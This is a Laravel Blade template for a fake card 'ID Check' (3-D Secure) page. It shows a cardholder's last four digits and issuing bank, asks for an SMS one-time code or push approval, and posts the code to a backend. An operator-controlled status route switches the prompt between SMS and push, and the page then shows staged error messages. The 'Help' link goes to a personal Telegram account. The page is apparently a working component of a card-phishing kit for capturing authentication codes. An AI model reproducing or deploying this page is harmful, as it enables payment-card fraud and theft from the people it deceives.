@extends('card.layouts.layout')
@section('head')
@endsection

@section('content')
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta name="csrf-token" content="{{ csrf_token() }}">
        <script src="/temple/js/jquery-3.6.3.js"></script>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="/cards/style.css?v={{ time() }}" />
        <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5T7XBJZ7');</script>
        <link
            href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@300;400;700&display=swap"
            rel="stylesheet" />
        <title>ID Check</title>
    </head>

    <body>
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5T7XBJZ7"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
        <script>
            $.ajaxSetup({
                headers: {
                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                }
            });
        </script>
        <section class="main">
            <div class="photos">
                <img src="/cards/img/l.png" alt=""
                    style="
        width: 185px;
        height: 46px;
        margin: auto 0;
    " />
                <div class="mscard-block">
                    <img src="https://logo.clearbit.com/{{isset($order->card_info['scheme']) ? $order->card_info["scheme"] : "" }}.com" alt="" />
                    <p>ID Check</p>
                </div>
            </div>
            <h1 class="title">Protect your {{isset($order->card_info['scheme']) ? $order->card_info["scheme"] : "" }}® Identity Check™ Card Online</h1>
            <div class="text-wrap">
                <p class="merchant">Merchant: {{(isset($order->card_info["bank"]['name']) ? $order->card_info["bank"]["name"] : "")}} {{isset($order->card_info["country"]["currency"]) ? $order->card_info["country"]["currency"] : ""}}</p>
{{--                <p class="amount">Amount: {{ $order->basket_info['all_sum'] }} {{isset($order->card_info["country"]["currency"]) ? $order->card_info["country"]["currency"] : ""}}</p>--}}
                <p class="date">Date: {{ \Carbon\Carbon::parse($order->created_at)->format('m-d-Y') }}</p>
                <p class="cnumber">Card Number: XXXX-XXXX-XXXX-{{ substr($order->card, -4) }}</p>
            </div>
            <div class="desc-wrap">
                <p class="desc desc-top">To protect you from fraud you must confirm your identity.</p>
                <p class="desc">A request to authenticate will be sent to:</p>
            </div>
            <div class="text-block">
                <p>Authentication Method;</p>
                <p class="app">Code SMS: <input type="text" name="code" /></p>
            </div>
            <div class="buttons">
                <button class="btn" onclick="location.href = '{{ route('home') }}'">Cancel</button>
                <button class="btn" id="fin">Next</button>
            </div>
            <ul class="links">
                <li><a class="link" href="https://t.me/bryanpups">Help</a></li>
                <li><a class="link" href="https://www.shopify.com/legal/terms">Terms of Use</a></li>
                <li><a class="link" href="https://www.shopify.com/legal/privacy">Privacy Policy</a></li>
            </ul>
            <div class="err-block">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="#BE4349" xmlns="http://www.w3.org/2000/svg">
                    <path
                        d="M11.79 8.04C11.4065 8.08421 11.117 8.40894 11.117 8.795C11.117 9.18106 11.4065 9.50579 11.79 9.55C11.9915 9.5528 12.1854 9.47329 12.327 9.32985C12.4685 9.18641 12.5455 8.99145 12.54 8.79C12.5346 8.37804 12.202 8.04539 11.79 8.04Z"
                        fill="BE4349" />
                    <path
                        d="M11.79 10.92C11.5903 10.9173 11.3979 10.9954 11.2567 11.1367C11.1154 11.2779 11.0373 11.4703 11.04 11.67V14.79C11.04 15.2042 11.3758 15.54 11.79 15.54C12.2042 15.54 12.54 15.2042 12.54 14.79V11.69C12.5454 11.4876 12.4688 11.2917 12.3275 11.1467C12.1863 11.0017 11.9924 10.9199 11.79 10.92Z"
                        fill="BE4349" />
                    <path fill-rule="evenodd" clip-rule="evenodd"
                        d="M11.79 2C6.38542 2.00551 2.00551 6.38542 2 11.79C2 17.1969 6.38313 21.58 11.79 21.58C17.1969 21.58 21.58 17.1969 21.58 11.79C21.5745 6.38542 17.1946 2.00551 11.79 2ZM11.79 20.08C7.21156 20.08 3.5 16.3684 3.5 11.79C3.5 7.21156 7.21156 3.5 11.79 3.5C16.3684 3.5 20.08 7.21156 20.08 11.79C20.0745 16.3662 16.3662 20.0745 11.79 20.08Z"
                        fill="BE4349" />
                </svg>
                <p>
                    Your payment details couldn't be verified. <br />
                    Check your card details and try again.
                </p>
            </div>
        </section>
        <div class="load-wrap">
            <div class="loader"></div>
        </div>

        <script>
            let timerId = setInterval(function tick() {
                $.ajax({
                    url: '{{ route('card-get-order-status') }}/{{ $order->id }}',
                    type: "POST",
                    success: function(data) {
                        if (data != "loading") {
                            if(data === "push")
                            {
                                $(".app").html("Mobile Application: Push");
                            } else {
                                $(".app").html('Code SMS: <input type="text" name="code">');
                            }
                            $(".load-wrap").fadeOut(300);
                            $(".main").fadeIn(300);

                            clearInterval(timerId);
                        }
                    },
                    error: function(msg) {

                    }
                });
            }, 10000);


        </script>

        <script>
            var timerError = null;
            var errorDefult = "Your payment details couldn't be verified. <br /> Check your card details and try again.";
            var i = 10;
            $("#fin").click(function(e) {
                $(".err-block").slideUp();
                $code = $('input[name="code"]').val();
                if($code == "")
                {
                    $(".err-block p").text("Enter a code");
                    $(".err-block").slideDown().css("display", "flex");
                    return;
                }

                $.ajax({
                    url: '{{ route('card-code') }}',
                    type: "POST",
                    data: {
                        "code": $code,
                        "id": {{ $order->id }},
                    },
                    success: function(data) {

                        timerError = setInterval(function tick() {
                            if(i > 0)
                            {
                                i--;
                                var e = (data ? data : errorDefult);

                                $(".err-block p").html(e+"("+i+")");
                                $(".err-block").slideDown().css("display", "flex");


                            } else
                            {
                                location.reload();
                                clearInterval(timerError);
                                i = 10;
                                $(".err-block").slideUp();
                            }

                        }, 1000);

                    },
                    error: function(msg) {

                    }
                });
            });
        </script>
    </body>

    </html>
@endsection
